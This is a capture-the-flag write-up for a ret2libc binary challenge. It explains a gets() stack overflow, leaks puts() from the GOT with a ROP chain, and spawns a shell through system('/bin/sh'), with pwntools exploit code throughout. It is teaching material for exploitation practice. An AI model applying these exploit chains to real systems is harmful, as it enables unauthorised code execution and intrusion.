# ret2libc
# Difficulty: Medium

Assumption: Know about the PLT/GOT, basic stack overflows, basic ROP theory
Ping me on discord (`garrettgu10#8125`) if you don't know these~!

You might also find it helpful to take a look at this writeup for a very
similar problem: 
https://github.com/utisss/ctf/tree/master/2020/ctf-10-16-2020/binary-shellcode2

When we first load up the binary in pwntools, we find that the program has ASLR
enabled, as well as NX, but does not use a stack canary.

```
[*] '/home/garrettgu/foreverctf/pwn-ret2libc/ret2libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Our end goal is to call system() in the libc library. However, since our target
program does not call system(), this means that the PLT does not contain an 
entry for system(). Looking at the symbol table, we see that there is a PLT 
entry for puts() and gets(), since these are the two only libc functions used
by the vulnerable program. 

Of course, the entire libc library itself is mapped into the program's address
space, but since we have ASLR enabled, the libc base address is subject to 
change. So we need to leak the libc address first. Our plan is to leak the 
address stored in the GOT for puts() (since our program already called it &
thus populated its GOT entry) by faking a call to puts() through the PLT. This
works since both the GOT and the PLT are linked statically within the target
ELF file. 

By inspecting the source code using a tool like Ghidra or Cutter, we can see 
that the main function calls gets() on a stack address. Since there's no stack
canary, this means that we can overwrite the return address. 

Using a process identical to the process in the writeup linked above, we find 
that inputting 56 filler bytes, followed by some 8-byte value replaces the 
return address with the value. 

We want to first leak the libc base. In order to do this, we call puts() 
through the PLT address, passing in the address to the GOT entry for puts().
Finally, we return to main, so we can put in another payload after leaking the
libc base address.

```python
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
pltputs = 0x401050 
# hardcoded address since pwntools seems to have issues getting the plt address through the symbol table
# you can find this address easily through the sidebar in Cutter, Ghidra, or by disassembling "puts" through objdump.
conn.send(b' '*56 + p64(poprdi) + p64(e.got['puts']) + p64(pltputs) + p64(e.symbols['main']) + b'\n')
```

Once we leaked the puts address, we can call system(), by finding some location
in the libc library that happens to contain the string "/bin/sh", popping an 
address to that string, then finally returning to the address of system(), 
offsetted by the libc base. Since libc requires RSP to be 16-byte aligned when
entering the function, I ran into a segfault halfway through executing system().
This alignment issue can be fixed by adding a ROP gadget consisting only of 
"RET" to pad out the rsp.

```python
libcoff = puts - libc.symbols['puts']
binsh = next(libc.search(b'/bin/sh')) + libcoff

print(hex(libcoff))

conn.send(b' '*56 + p64(poprdi) + p64(binsh) + p64(ret) + p64(libcoff + libc.symbols['system']) + b'\n')

conn.interactive()
```

The full solution code is available here at `solution.py`. Please ping me on 
Discord (`garrettgu10#8125`)if any part of my writeup needs clarification ^^
